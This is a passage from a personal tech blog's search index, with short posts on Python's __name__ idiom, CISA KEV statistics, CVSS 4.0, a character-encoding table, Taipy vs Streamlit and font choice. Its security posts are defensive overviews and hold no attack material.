build the second after understanding Docker Image Layers. Links # https://www.youtube.com/watch?v=JDw3ZdQcv2g ","date":"2023-12-21 19:20","externalUrl":null,"permalink":"/posts/learn_docker/build_container_images/","section":"posts","summary":"Build your first image, and build the second after understanding Docker Image Layers.","title":"Build Container Images","type":"posts"},{"content":"","date":"2023-12-21 19:20","externalUrl":null,"permalink":"/tags/docker/","section":"tags","summary":"","title":"docker","type":"tags"},{"content":"","date":"2023-12-21 19:20","externalUrl":null,"permalink":"/series/learn_docker/","section":"series","summary":"","title":"Learn_Docker","type":"series"},{"content":" There is a situation why we need to start our Python script with if __name__ == '__main__':. So, what does if __name__ == '__main__': mean?\nWhy it Matters? # It is a way to ensure that a specific block of code runs only when the Python script is executed directly, and not when it\u0026rsquo;s imported as a module.\nWhat is __name__? # The __name__ is a built in variable in Python. It represents the current module\u0026rsquo;s name.\nWhen we run a Python script, Python will assign __main__ to the __name__ variable if the script is the main program being executed.\nExample # Here, we have a Python script display_name.py with a define function called display to output the parameter name.\n# display_name.py def display(name): print(f\u0026#39;Hello, {name}\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: user_name = input(\u0026#39;Enter name: \u0026#39;) display(user_name) In this script (above), the following block will execute only if we run the script directly.\nif __name__ == \u0026#39;__main__\u0026#39;: user_name = input(\u0026#39;Enter name: \u0026#39;) display(user_name) This has been enforced by if __name__ == '__main__':.\nWhat if we have another script, which we need to reuse the function display but we do not want to execute the block of code above?\nHere is another Python script which like to reuse the display function.\n# another_script.py from display_name import display name = \u0026#39;Foo\u0026#39; display(name) It is all about making our code reusable. With if __name__ == '__main__':, it allows us to create Python script that can be imported as module, and reuse the function within.\nWhen the first script display_name.py is imported as a module, the code inside the if __name__ == '__main__': will not be executed.\nSummary # With if __name__ == '__main__'::\nIt is handy way to reuse function within a large Python project. It allows reuse of functions and classes from one script into another without running the whole script every time. It helps keeping things clean and organized. It helps creating versatile Python module. ","date":"2023-12-14 22:17","externalUrl":null,"permalink":"/posts/understanding_python_name/","section":"posts","summary":"Wonder why we always start with \u003ccode\u003eif __name__ == '__main__':\u003c/code\u003e in Python?","title":"Why __name__ == '__main__'?","type":"posts"},{"content":" There are total of 18 CVE been added to CISA KEV catalog in November 2023.\nCISA Catalog of Known Exploited Vulnerabilities [ 2023.12.01/1043 ]\nUpdates # As of today, 8 CVE have overdue (within Nov), and another 10 will due in Dec 2023.\nHighlights:\nThe top-5 vendors with highest number of vulnerabilities remain the same. The top-5 vulnerable products remain the same. The mean value increases to 86.916 (was 85.4167) The top-5 months where distribution of KEV is higher than mean remain the same. Current State # Microsoft Apple Cisco Adobe Google others 275 68 67 65 51 517 Windows Multiple Products (Apple) Internet Explorer Flash Player Chromium V8 Engine others 108 31 31 29 25 819 mean_val=86.91666666666667\nJan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec 14 20 120 157 233 146 58 46 48 45 125 31 ","date":"2023-12-01 09:07","externalUrl":null,"permalink":"/posts/cisa_kev_25m/","section":"posts","summary":"See what happen to CISA KEV cataglog by end of Nov 2023.","title":"State of KEV After 25 months","type":"posts"},{"content":"","date":"2023-11-30 19:47","externalUrl":null,"permalink":"/tags/auth/","section":"tags","summary":"","title":"auth","type":"tags"},{"content":" Signing in without a password seems almost nonsensical, yet it can be more secure than traditional sign-ins. Today, I received my YubiKey (from Yubico), as a gift for myself from Cyber Monday sales. And this marks as the begining of my passwordless journey.\nYubiKey 5C NFC Links # Yubico - Setup YubiKey Adopting PasswordLess ","date":"2023-11-30 19:47","externalUrl":null,"permalink":"/posts/my_yubikey/","section":"posts","summary":"Have my YubiKey (5C NFC) from Cyber Monday 2023.","title":"My First YubiKey","type":"posts"},{"content":"","date":"2023-11-23 07:35","externalUrl":null,"permalink":"/tags/streamlit/","section":"tags","summary":"","title":"streamlit","type":"tags"},{"content":"","date":"2023-11-23 07:35","externalUrl":null,"permalink":"/tags/taipy/","section":"tags","summary":"","title":"taipy","type":"tags"},{"content":" Comparing Streamlit and Taipy on various parameters. Overview # Taipy and Streamlit are both Python libraries to create web apps in Python. Both are popular choices for data scientists and machine learning engineers who want to quickly and easily sharing of work with others.\nTaipy # Taipy is a full-stack web development framework that is designed to make it easy to create complex web apps. It has a declarative syntax that makes it easy to define the layout and behavior of your app. Taipy also supports a wide range of features, including:\nData nodes for managing data Tasks for running data pipelines Scenarios for defining different user flows Version control for tracking changes to your app Streamlit # It is a lightweight library that is designed to make it easy to create simple web apps. It has a very simple API that makes it easy to get started. Streamlit also has a number of features that make it a good choice for prototyping, including:\nLive reloading for instant feedback Rich widgets for displaying data A command-line interface for deploying apps Comparison # Streamlit Taipy Prototyping Simple to design apps Need understanding in Markdown. Callbacks Use global event loop that triggers and renders all components Use trigger callback for that specific elements without rendering other elements agaian. Design Flexibility Standard design makes each app appears the same Flexible design can make each app appears differently. Big Data Has no inherent support for handling large amounts of data Can handle large amount of data with pagination, chart decimator, and Async execution. Framework Simple front-end framework Dedicated support for backend and interactive data pipeline. Links # Taipy Streamlit ","date":"2023-11-23 07:35","externalUrl":null,"permalink":"/posts/taipy_vs_streamlit/","section":"posts","summary":"Quick comparison between Taipy and Streamlit.","title":"Taipy vs Streamlit","type":"posts"},{"content":" Showing you the differences between ASCII, CP-1252 and ISO-8859-1. Intro # ASCII ASCII is a 7-bit character encoding. It can go from 0 to 127 (0x7F) only. CP-1252 CP-1252 is an 8-bit character encoding based on ASCII. It is identical to ASCII up to code point 127. ISO-8859-1 8859-1 is also an 8-bit character encoding based on CP-1252. However, 8859-1 differs from CP-1252 in sticks 8 (0x80-0x8F) and 9 (0x90-0x9F). 8859-1 is also the default character set used in HTML4. Unicode, UTF-8 or UTF-16, is a multi-byte character encoding based on ISO-8859-1. They are identical up to code point 255. UTF-8 is the default character set used in HTML5. See more encoding methods at : Encoding 101 2023-08-12 13:00\u0026middot;580 words\u0026middot;3 mins Posts 101 cli encoding Some notes about encoding: HTML encoding, URL encoding and ASCII encoding. Code Point ASCII CP-1251 8859-1 Unicode 0x00 - 0x7f same \u0026lt;-same \u0026lt;-same \u0026lt;-same 0x80 - 0x8f N/A diff-\u0026gt; \u0026lt;-diff \u0026lt;-same 0x90 - 0x9f N/A diff-\u0026gt; \u0026lt;-diff \u0026lt;-same 0xa0 - 0xff N/A same same \u0026lt;-same Character Sets # All the 256 characters are broken down to 3 groups:\nFrom 0 - 127 From 128 - 159 (stick8 and stick9) From 160 - 255 :zero:-:one::two::seven: # Description ASCII CP-1252 8859-1 Oct Hex Dec Stick/Pos Null NUL NUL NUL 000 0x00 0 0/1 Start of Header SOH SOH SOH 001 0x01 1 0/2 Start of Text STX STX STX 002 0x02 2 0/3 End of Text ETX ETX ETX 003 0x03 3 0/4 End of Transmission EOT EOT EOT 004 0x04 4 0/5 Enquiry ENQ ENQ ENQ 005 0x05 5 0/6 Acknowledge ACK ACK ACK 006 0x06 6 0/7 Bell BEL BEL BEL 007 0x07 7 0/8 Backspace BS BS BS 010 0x08 8 0/9 Horizontal Tab HT HT HT 011 0x09 9 0/10 Linefeed LF LF LF 012 0x0A 10 0/11 Vertical Tab VT VT VT 013 0x0B 11 0/12 Form Feed FF FF FF 014 0x0C 12 0/13 Carriage Return CR CR CR 015 0x0D 13 0/14 Shift Out SO SO SO 016 0x0E 14 0/15 Shift In SI SI SI 017 0x0F 15 0/16 Data Link Escape DLE DLE DLE 020 0x10 16 1/1 Device Control 1 DC1 DC1 DC1 021 0x11 17 1/2 Device Control 2 DC2 DC2 DC2 022 0x12 18 1/3 Device Control 3 DC3 DC3 DC3 023 0x13 19 1/4 Device Control 4 DC4 DC4 DC4 024 0x14 20 1/5 Negative Acknowledge NAK NAK NAK 025 0x15 21 1/6 Synchronous Idle SYN SYN SYN 026 0x16 22 1/7 End of Transmission ETB ETB ETB 027 0x17 23 1/8 Cancel CAN CAN CAN 030 0x18 24 1/9 End of Medium EM EM EM 031 0x19 25 1/10 Substitute SUB SUB SUB 032 0x1A 26 1/11 Escape ESC ESC ESC 033 0x1B 27 1/12 File Separator FS FS FS 034 0x1C 28 1/13 Group Separator GS GS GS 035 0x1D 29 1/14 Record Separator RS RS RS 036 0x1E 30 1/15 Unit Separator US US US 037 0x1F 31 1/16 Space SP SP SP 040 0x20 32 2/1 Exclamation Mark ! ! ! 041 0x21 33 2/2 Quotation Mark \u0026quot; \u0026quot; \u0026quot; 042 0x22 34 2/3 Number Sign # # # 043 0x23 35 2/4 Dollar Sign $ $ $ 044 0x24 36 2/5 Percent Sign % % % 045 0x25 37 2/6 Ampersand \u0026amp; \u0026amp; \u0026amp; 046 0x26 38 2/7 Apostrophe ' ' ' 047 0x27 39 2/8 Left Parenthesis ( ( ( 050 0x28 40 2/9 Right Parenthesis ) ) ) 051 0x29 41 2/10 Asterisk * * * 052 0x2A 42 2/11 Plus Sign + + + 053 0x2B 43 2/12 Comma , , , 054 0x2C 44 2/13 Hyphen-Minus - - - 055 0x2D 45 2/14 Full Stop . . . 056 0x2E 46 2/15 Solidus / / / 057 0x2F 47 2/16 Digit Zero 0 0 0 060 0x30 48 3/1 Digit One 1 1 1 061 0x31 49 3/2 Digit Two 2 2 2 062 0x32 50 3/3 Digit Three 3 3 3 063 0x33 51 3/4 Digit Four 4 4 4 064 0x34 52 3/5 Digit Five 5 5 5 065 0x35 53 3/6 Digit Six 6 6 6 066 0x36 54 3/7 Digit Seven 7 7 7 067 0x37 55 3/8 Digit Eight 8 8 8 070 0x38 56 3/9 Digit Nine 9 9 9 071 0x39 57 3/10 Colon : : : 072 0x3A 58 3/11 Semicolon ; ; ; 073 0x3B 59 3/12 Less-Than Sign \u0026lt; \u0026lt; \u0026lt; 074 0x3C 60 3/13 Equals Sign = = = 075 0x3D 61 3/14 Greater-Than Sign \u0026gt; \u0026gt; \u0026gt; 076 0x3E 62 3/15 Question Mark ? ? ? 077 0x3F 63 3/16 Commercial At @ @ @ 100 0x40 64 4/1 Latin Capital Letter A A A A 101 0x41 65 4/2 Latin Capital Letter B B B B 102 0x42 66 4/3 Latin Capital Letter C C C C 103 0x43 67 4/4 Latin Capital Letter D D D D 104 0x44 68 4/5 Latin Capital Letter E E E E 105 0x45 69 4/6 Latin Capital Letter F F F F 106 0x46 70 4/7 Latin Capital Letter G G G G 107 0x47 71 4/8 Latin Capital Letter H H H H 110 0x48 72 4/9 Latin Capital Letter I I I I 111 0x49 73 4/10 Latin Capital Letter J J J J 112 0x4A 74 4/11 Latin Capital Letter K K K K 113 0x4B 75 4/12 Latin Capital Letter L L L L 114 0x4C 76 4/13 Latin Capital Letter M M M M 115 0x4D 77 4/14 Latin Capital Letter N N N N 116 0x4E 78 4/15 Latin Capital Letter O O O O 117 0x4F 79 4/16 Latin Capital Letter P P P P 120 0x50 80 5/1 Latin Capital Letter Q Q Q Q 121 0x51 81 5/2 Latin Capital Letter R R R R 122 0x52 82 5/3 Latin Capital Letter S S S S 123 0x53 83 5/4 Latin Capital Letter T T T T 124 0x54 84 5/5 Latin Capital Letter U U U U 125 0x55 85 5/6 Latin Capital Letter V V V V 126 0x56 86 5/7 Latin Capital Letter W W W W 127 0x57 87 5/8 Latin Capital Letter X X X X 130 0x58 88 5/9 Latin Capital Letter Y Y Y Y 131 0x59 89 5/10 Latin Capital Letter Z Z Z Z 132 0x5A 90 5/11 Left Square Bracket [ [ [ 133 0x5B 91 5/12 Reverse Solidus \\ \\ \\ 134 0x5C 92 5/13 Right Square Bracket ] ] ] 135 0x5D 93 5/14 Circumflex Accent ^ ^ ^ 136 0x5E 94 5/15 Low Line _ _ _ 137 0x5F 95 5/16 Grave Accent ` ` ` 140 0x60 96 6/1 Latin Small Letter A a a a 141 0x61 97 6/2 Latin Small Letter B b b b 142 0x62 98 6/3 Latin Small Letter C c c c 143 0x63 99 6/4 Latin Small Letter D d d d 144 0x64 100 6/5 Latin Small Letter E e e e 145 0x65 101 6/6 Latin Small Letter F f f f 146 0x66 102 6/7 Latin Small Letter G g g g 147 0x67 103 6/8 Latin Small Letter H h h h 150 0x68 104 6/9 Latin Small Letter I i i i 151 0x69 105 6/10 Latin Small Letter J j j j 152 0x6A 106 6/10 Latin Small Letter K k k k 153 0x6B 107 6/10 Latin Small Letter L l l l 154 0x6C 108 6/10 Latin Small Letter M m m m 155 0x6D 109 6/10 Latin Small Letter N n n n 156 0x6E 110 6/10 Latin Small Letter O o o o 157 0x6F 111 6/10 Latin Small Letter P p p p 160 0x70 112 7/1 Latin Small Letter Q q q q 161 0x71 113 7/2 Latin Small Letter R r r r 162 0x72 114 7/3 Latin Small Letter S s s s 163 0x73 115 7/4 Latin Small Letter T t t t 164 0x74 116 7/5 Latin Small Letter U u u u 165 0x75 117 7/6 Latin Small Letter V v v v 166 0x76 118 7/7 Latin Small Letter W w w w 167 0x77 119 7/8 Latin Small Letter X x x x 170 0x78 120 7/9 Latin Small Letter Y y y y 171 0x79 121 7/10 Latin Small Letter Z z z z 172 0x7A 122 7/11 Left Curly Bracket { { { 173 0x7B 123 7/12 Vertical Line | | | 174 0x7C 124 7/13 Right Curly Bracket } } } 175 0x7D 125 7/14 Tilde ~ ~ ~ 176 0x7E 126 7/15 Delete DEL DEL DEL 177 0x7F 127 7/16 :one::two::eight:-:one::five::nine: # Stick Pos CP-1252 8859-1 Hex Dec Description 8 1 € PAD 0x80 128 Pad Stop 2 HOP 0x81 129 High octet preset 3 ‚ BPH 0x82 130 Break Permitted Here 4 ƒ NBH 0x83 131 No Break Here 5 „ IND 0x84 132 Index 6 … NEL 0x85 133 Next Line 7 † SSA 0x86 134 Start of Selected Area 8 ‡ ESA 0x87 135 End of Selected Area 9 ˆ HTS 0x88 136 Horizontal Tabulation Set 10 ‰ HTJ 0x89 137 Horizontal Tabulation with Justification 11 Š VTS 0x8A 138 Vertical Tabulation Set 12 ‹ PLD 0x8B 139 Partial Line Down 13 Œ PLU 0x8C 140 Partial Line Up 14 RI 0x8D 141 Reverse Line Feed 15 Ž SS2 0x8E 142 Single-Shift 2 16 SS3 0x8F 143 Single-Shift 3 Stick Pos CP-1252 8859-1 Hex Dec Description 9 1 DCS 0x90 144 Device control string 2 ‘ PU1 0x91 145 Private use 1 3 ’ PU2 0x92 146 Private use 2 4 “ STS 0x93 147 Set transmit state 5 ” CCH 0x94 148 Cancel character 6 • MW 0x95 149 Message waiting 7 – SPA 0x96 150 Start protected area 8 — EPA 0x97 151 End protected area 9 ˜ SOS 0x98 152 Start of string 10 ™ SGCI 0x99 153 Single graphic character introducer 11 š SCI 0x9A 154 Single character introducer 12 › CSI 0x9B 155 Control sequence introducer 13 œ ST 0x9C 156 String terminator 14 OSC 0x9D 157 Operating system command 15 ž PM 0x9E 158 Private message 16 Ÿ APC 0x9F 159 Application program command :one::six::zero:-:two::five::five: # Stick Pos CP-1252 8859-1 Hex Dec Description 10 1 [NBSP] [NBSP] 0xA0 160 No-Break Space 2 0xA1 161 Inverted Exclamation Mark 3 0xA2 162 Cent Sign 4 0xA3 163 Pound Sign 5 0xA4 164 Currency Sign 6 0xA5 165 Yen Sign 7 0xA6 166 Broken Bar 8 0xA7 167 Section Sign 9 0xA8 168 Diaeresis 10 0xA9 169 Copyright Sign 11 0xAA 170 Feminine Ordinal Indicator 12 0xAB 171 Left-Pointing Double Angle Quotation Mark 13 0xAC 172 Not Sign 14 0xAD 173 Soft Hyphen 15 0xAE 174 Registered Sign 16 0xAF 175 Macron 11 1 0xB0 176 Degree Sign 2 0xB1 177 Plus-Minus Sign 3 0xB2 178 Superscript Two 4 0xB3 179 Superscript Three 5 0xB4 180 Acute Accent 6 0xB5 181 Micro Sign 7 0xB6 182 Pilcrow Sign 8 0xB7 183 Middle Dot 9 0xB8 184 Cedilla 10 0xB9 185 Superscript One 11 0xBA 186 Masculine Ordinal Indicator 12 0xBB 187 Right-Pointing Double Angle Quotation Mark 13 0xBC 188 Fraction One Quarter 14 0xBD 189 Fraction One Half 15 0xBE 190 Fraction Three Quarters 16 0xBF 191 Inverted Question Mark 12 1 0xC0 192 Latin Capital Letter A with Grave 2 ¡ ¡ 0xC1 193 Latin Capital Letter A with Acute 3 ¢ ¢ 0xC2 194 Latin Capital Letter A with Circumflex 4 £ £ 0xC3 195 Latin Capital Letter A with Tilde 5 ¤ ¤ 0xC4 196 Latin Capital Letter A with Diaeresis 6 ¥ ¥ 0xC5 197 Latin Capital Letter A with Ring Above 7 ¦ ¦ 0xC6 198 Latin Capital Letter AE (ligature) 8 § § 0xC7 199 Latin Capital Letter C with Cedilla 9 ¨ ¨ 0xC8 200 Diaeresis 10 © © 0xC9 201 Copyright Sign 11 ª ª 0xCA 202 Feminine Ordinal Indicator 12 « « 0xCB 203 Left-Pointing Double Angle Quotation Mark 13 ¬ ¬ 0xCC 204 Not Sign 14 ­ ­ 0xCD 205 Soft Hyphen 15 ® ® 0xCE 206 Registered Sign 16 ¯ ¯ 0xCF 207 Macron 13 1 ° ° 0xD0 208 Degree Sign 2 ± ± 0xD1 209 Plus-Minus Sign 3 ´ ´ 0xD2 210 Acute Accent 4 µ µ 0xD3 211 Micro Sign 5 ¶ ¶ 0xD4 212 Pilcrow Sign 6 · · 0xD5 213 Middle Dot 7 ¸ ¸ 0xD6 214 Cedilla 8 ¹ ¹ 0xD7 215 Superscript One 9 º º 0xD8 216 Masculine Ordinal Indicator 10 » » 0xD9 217 Right-Pointing Double Angle Quotation Mark 11 ¼ ¼ 0xDA 218 Fraction One Quarter 12 ½ ½ 0xDB 219 Fraction One Half 13 ¾ ¾ 0xDC 220 Fraction Three Quarters 14 ¿ ¿ 0xDD 221 Inverted Question Mark 15 À À 0xDE 222 Latin Capital Letter A with Grave 16 Á Á 0xDF 223 Latin Capital Letter A with Acute 14 1 à à 0xE0 224 Latin Small Letter A with Grave 2 á á 0xE1 225 Latin Small Letter A with Acute 3 â â 0xE2 226 Latin Small Letter A with Circumflex 4 ã ã 0xE3 227 Latin Small Letter A with Tilde 5 ä ä 0xE4 228 Latin Small Letter A with Diaeresis 6 å å 0xE5 229 Latin Small Letter A with Ring Above 7 æ æ 0xE6 230 Latin Small Letter AE (ligature) 8 ç ç 0xE7 231 Latin Small Letter C with Cedilla 9 è è 0xE8 232 Latin Small Letter E with Grave 10 é é 0xE9 233 Latin Small Letter E with Acute 11 ê ê 0xEA 234 Latin Small Letter E with Circumflex 12 ë ë 0xEB 235 Latin Small Letter E with Diaeresis 13 ì ì 0xEC 236 Latin Small Letter I with Grave 14 í í 0xED 237 Latin Small Letter I with Acute 15 î î 0xEE 238 Latin Small Letter I with Circumflex 16 ï ï 0xEF 239 Latin Small Letter I with Diaeresis 15 1 ð ð 0xF0 240 Latin Small Letter Eth (Icelandic) 2 ñ ñ 0xF1 241 Latin Small Letter N with Tilde 3 ò ò 0xF2 242 Latin Small Letter O with Grave 4 ó ó 0xF3 243 Latin Small Letter O with Acute 5 ô ô 0xF4 244 Latin Small Letter O with Circumflex 6 õ õ 0xF5 245 Latin Small Letter O with Tilde 7 ö ö 0xF6 246 Latin Small Letter O with Diaeresis 8 ÷ ÷ 0xF7 247 Division Sign 9 ø ø 0xF8 248 Latin Small Letter O with Stroke 10 ù ù 0xF9 249 Latin Small Letter U with Grave 11 ú ú 0xFA 250 Latin Small Letter U with Acute 12 û û 0xFB 251 Latin Small Letter U with Circumflex 13 ü ü 0xFC 252 Latin Small Letter U with Diaeresis 14 ý ý 0xFD 253 Latin Small Letter Y with Acute 15 þ þ 0xFE 254 Latin Small Letter Thorn (Icelandic) 16 ß ß 0xFF 255 Latin Small Letter Sharp S (German) Links # Code: The Hidden Language of Computer Hardware and Software Book (Chap 13) Interactive Illustrations ","date":"2023-11-10 19:13","externalUrl":null,"permalink":"/posts/character_encoding_set/","section":"posts","summary":"ASCII vs CP-1252 vs ISO-8859-1","title":"Character Encoding Set","type":"posts"},{"content":"","date":"2023-11-10 19:13","externalUrl":null,"permalink":"/tags/encoding/","section":"tags","summary":"","title":"encoding","type":"tags"},{"content":" Data science and data analytics. Are they the same thing? While these terms are often used interchangeably, they have different focuses.\nData science is presented as an overarching umbrella term that includes tasks like finding patterns, training machine learning models, and deploying AI applications.\nData analytics, on the other hand, is portrayed as a specialization of data science, concentrating on querying, interpreting, and visualizing datasets.\nThe data science lifecycle is outlined with seven phases: identifying a problem or opportunity, data mining, data cleaning, data exploration analysis, feature engineering, predictive modeling, and data visualization. The role of a data scientist is highlighted as in-demand, requiring skills in machine learning, AI, coding (Python and R), big data platforms, and database knowledge.\nData analytics is described as the job of conceptualizing existing datasets for decision-making. Four ways to conceptualize data are presented: predictive analytics, prescriptive analytics, diagnostic analytics, and descriptive analytics. The skills required for a data analyst include analytical and programming skills, familiarity with databases, statistical analysis, and data visualization.\nSummary # Data Science Data Analytic Roles Data Scientist Data Analyst Skills Machine learning, AI, programming languages (Python, R), big data platforms (Hadoop, Apache Spark), database knowledge (SQL) Data wrangling including Analytical skills, programming skills, statistical analysis, data visualization Process 7 phases 4 types Tools Python, R, SAS Excel, Tableau, Power BI Goals To forecast and predict based on the extracted knowledge and insights. To make decisions based on the data collected and analyzed. Objectives To develop algorithms and models that can be used to predict or forecast future outcomes and behaviors. To use statistical tools and techniques to interpret existing data and offer actionable insights. Application Forecasting, predictive modeling, anomaly detection, fraud detection, image recognition, natural language processing Business intelligence, market research, customer analytics, risk assessment, supply chain management In summary, data science involves the entire data lifecycle, including creating new algorithms, while data analytics is more focused on using statistical tools to interpret existing data.\nBoth roles are valuable, and the distinction is essential for those considering a career in either field.\nYT Video # https://www.youtube.com/watch?v=dcXqhMqhZUo ","date":"2023-11-09 15:51","externalUrl":null,"permalink":"/posts/data_analytics_data_science/","section":"posts","summary":"Quick review on the distinction between Data Science and Data Analytic.","title":"Data Science vs Data Analytic","type":"posts"},{"content":"","date":"2023-11-09 15:51","externalUrl":null,"permalink":"/tags/science/","section":"tags","summary":"","title":"science","type":"tags"},{"content":"","date":"2023-11-04 08:07","externalUrl":null,"permalink":"/tags/cvss/","section":"tags","summary":"","title":"cvss","type":"tags"},{"content":" Key Takeaways:\nCVSS v4 comes with new features, including added base metrics and new supplemental metric. CVSS v4 is more useful for assessing the severity of OT/ICS/Safety systems. CVSS v4 has new nomenclature and organizations should start planning the migration. Intro # CVSS essentially provides a way to capture the principal technical characteristics of a security vulnerability and produce a numerical score denoting its severity. The score can be translated into various levels, such as low, medium, high, and critical, to help organizations prioritize their vulnerability management processes.\nOn Nov 1 of 2023, the FIRST has officially launched CVSS v4.0, the latest version of Common Vulnerabiltiy Scoring System standard in replacing the CVSS v3.0 (released in June 2015). BTW, CVSS v3.1 was released in June 2019.\nCVSS v3.1 has emphasize and clarify that \u0026ldquo;CVSS is designed to measure the severity of a vulnerabiltiy and should not be used alone to assess risk.\u0026rdquo;\nCVSS v3.1 attracted criticism for lack of granularity in scoing scale and OT/ICS/Safety focus.\nWhat\u0026rsquo;s New? # Here I highlight some new features introduced in CVSS v4.0:\nNew level of granularity with added Base Metrics and Values. Clearer insight into vulnerability impact with assessing effects and subsequent systems. Simplifying the Threat Metrics to focus on Exploit Maturity. New Supplemental Metric Group. New nomenclature to enumerate CVSS scores: Base (CVSS-B) Base + Threat (CVSS-BT), Base + Envrionmental (CVSS-BE) Base + Threat + Environmental (CVSS-BTE) Below is the summary of the differences between CVSS v4.0 and v3.1:\nFeature CVSS v4.0 CVSS v3.1 Base 11 metrics 8 metrics Exploitablity\n1. Attack Vector (AV)\n2. Attack Complexity (AC)\n3. Attack Requirements (AT)\n4. Privileges Required (PR)\n5. User Interaction (UI) 1. Attack Vector (AV)\n2. Attack Complexity (AC)\n3. Privileges Required (PR)\n4. User Interaction (UI) Vulnerable System Impact\n6. Confidentiality (VC)\n7. Integrity (VI)\n8. Availability (VA)\nSubsequent System Impact\n9. Confidentiality (SC)\n10. Integrity (SI)\n11. Availability (SA) Impact\n5. Confidentiality (C)\n6. Integrity (I)\n7. Availability (A) N/A 8. Scope Threat Threat:\n- Exploit Maturity (E) Temporal:\n- Exploit Code Maturity (E)\n- Remediation Level (RL)\n- Report Confidence (RC) Environmental - Modified (11)\n- Consumer-assessed Safety (MSI:S, MSA:S) - Modified (8) Supplemental Group - Safety (S)\n- Automatable (A)\n- Recovery (R)\n- Value Density (V)\n- Response Effort (RE)\n- Urgency (U) None OT/ICS/Safety Focus Yes No Notes # The concept of CVSS is not just the Base score. The CVSS Base Score should be supplemented with an analysis of threat factor (change over time) and the environment factor (security controls).\nTools and Links # CVSS Calculator: v4.0 and v3.1 CVSS v4.0 Specification CVSS v4.0 Presentation ","date":"2023-11-04 08:07","externalUrl":null,"permalink":"/posts/cvss_4/","section":"posts","summary":"New CVSS 4.0 vulnerability severity rating standard released.","title":"Quick Review on CVSS 4.0","type":"posts"},{"content":"","date":"2023-11-01 07:58","externalUrl":null,"permalink":"/tags/chart/","section":"tags","summary":"","title":"chart","type":"tags"},{"content":" What we can learn from CISA KEV after 24 months? KEV # The Known Exploited Vulnerabilities (KEV) catalog, launched by CISA in Nov 2021, is a list of vulnerabilities that are actively exploited by malicious actors.\nAs of yesterday (Oct 31), the list has grown up to 1025 vulnerabilities. This is a valuable resource for organizations to prioritize their vulnerability remediation efforts and protect themselves from cyber attacks.\nHere are some key takeaways from the CISA KEV catalog:\nMany of the vulnerabilities in the KEV catalog are old and well-known, highlighting the importance of regular patching. Organizations should implement a layered security approach to protect against known exploited vulnerabilities, including patching, security awareness training, and network segmentation. It is important to monitor systems for suspicious activity to detect and respond to cyber attacks early. Vulnerability Analysis # With these 24 months data, can we learn something out of it? Maybe for some funs ?\nTo have some funs for analysing the CISA KEV, we can:\nDownload a copy of the KEV JSON file. Visualize the data with charts (like Taipy). Identify the trends and patterns: show the top-5 vulnerable vendors. show the top-5 vulnerable products. compare the data to previous year. correlate with the number of cyber attacks that occur identify vulnerabilities in certain months. Below, here are the 2 ways that I\u0026rsquo;m doing analysis in CISA KEV data.\nEg.1: KEV Fun Enrichments # Top 5 vendors (listed in CISA KEV catalog). Top 5 products (listed in CISA KEV catalog). Distribution of KEV (based on months). Top 5 of 165 vendors : 521/1025 [ 50.83% ] Top 5 of 422 products: 219/1025 [ 21.37% ] You can click on the legend to filter in the chart.\nMicrosoft Apple Cisco Adobe Google others 271 68 67 65 50 504 Windows Multiple Products (Apple) Internet Explorer Flash Player Chromium V8 Engine others 103 31 31 29 25 806 mean_val=85.4167\nJan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec 14 20 120 157 233 146 58 46 48 45 117 21 Key TakeAways: There are 5 months (Mar/Apr/May/Jun/Nov) where the distribution of KEV is higher than mean value.\nAnd this means more resources should be allocated for those months (in red).\nEg.2: KEV Dashboard (cmdline) # This is a cmdline tool (written in Python) that can provide:\ntop 5 vendors listed in KEV. top 5 products listed in KEV. heartmap calendar for vulnerability due date. heartmap calendar for vulnerability added. See more at https://myseq.blogspot.com/2022/04/kev-dashboard.html Key TakeAways: The top 5 vendors/products info allow quickly analyze trends of KEV to better add intelligence-led prioritization to vulnerability management.\nLinks # Using KEV Dashboard. CISA KEV Catalog Hits 860 After 13 Months. Using Taipy Cloud. ","date":"2023-11-01 07:58","externalUrl":null,"permalink":"/posts/cisa_kev_distribution/","section":"posts","summary":"How can we identify the trends and patterns in CISA KEV?","title":"CISA KEV Distribution","type":"posts"},{"content":"","date":"2023-11-01 07:58","externalUrl":null,"permalink":"/tags/graph/","section":"tags","summary":"","title":"graph","type":"tags"},{"content":"","date":"2023-11-01 07:58","externalUrl":null,"permalink":"/tags/shortcodes/","section":"tags","summary":"","title":"shortcodes","type":"tags"},{"content":"","date":"2023-10-26 13:03","externalUrl":null,"permalink":"/tags/font/","section":"tags","summary":"","title":"font","type":"tags"},{"content":" Fira Code is selected as the main font used by MySeq site. Font Proofing # MySeq site has selected Fira Code font as the main font since day-1. The main reason is Font Proofing.\nFont Proofing is the process of ensuring a font displays correctly and consistently across any various platform. It involves checking for technical issues that might affect readability or cause confusion.\nFira Code # Fira Code has been a popular choice for programmers due to its focus on readability and functionality. These are the important aspectes considered during font proofing.\nThere are 5 groups of character/number that I checked for \u0026ldquo;font-proofed\u0026rdquo; every time.\nLowercase o (o), uppercase O (O), and number 0 (0): These can be tricky to tell apart, especially in fonts with a round or loopy design. Lowercase l (l), uppercase L (L), and number 1 (1): Similar to your original question, some fonts might not have clear distinctions between these, particularly for the lowercase L and number 1. Lowercase b (b), number 6 (6), and sometimes uppercase B (B): In some fonts with a closed top on the lowercase b, it can be confused with a number 6. Additionally, some script fonts might have a B that looks similar to a lowercase b. Uppercase B (B) and number 8 (8): This confusion is less common but can happen in certain fonts where the B doesn\u0026rsquo;t have a clear distinction between its two loops. Lowercase g (g) and number 9 (9): Fonts with a closed tail on the lowercase g can be mistaken for a number 9. Demo # Here is the demo of Fira Code for the 5 groups above.\nUpperCase LowerCase Number Group 1 O o 0 Group 2 I l 1 Group 3 B b 6 Group 4 B 8 Group 5 g 9 Links # Fira Code at Google Fonts. ","date":"2023-10-26 13:03","externalUrl":null,"permalink":"/posts/font_used/","section":"posts","summary":"Why Fira Code font is used here?","title":"Font Used in MySeq","type":"posts"},{"content":"","date":"2023-10-26 13:03","externalUrl":null,"permalink":"/categories/myseq/","section":"categories","summary":"","title":"MySeq","type":"categories"},{"content":" Getting start with Docker basic in less than 36 min. Links # https://www.youtube.com/watch?v=Nm1tfmZDqo8 ","date":"2023-10-25 02:50","externalUrl":null,"permalink":"/posts/learn_docker/getting_started/","section":"posts","summary":"Learning Docker in 2023, getting started!","title":"Getting Started","type":"posts"},{"content":"","date":"2023-10-22 06:06","externalUrl":null,"permalink":"/tags/determination/","section":"tags","summary":"","title":"determination","type":"tags"},{"content":"","date":"2023-10-22 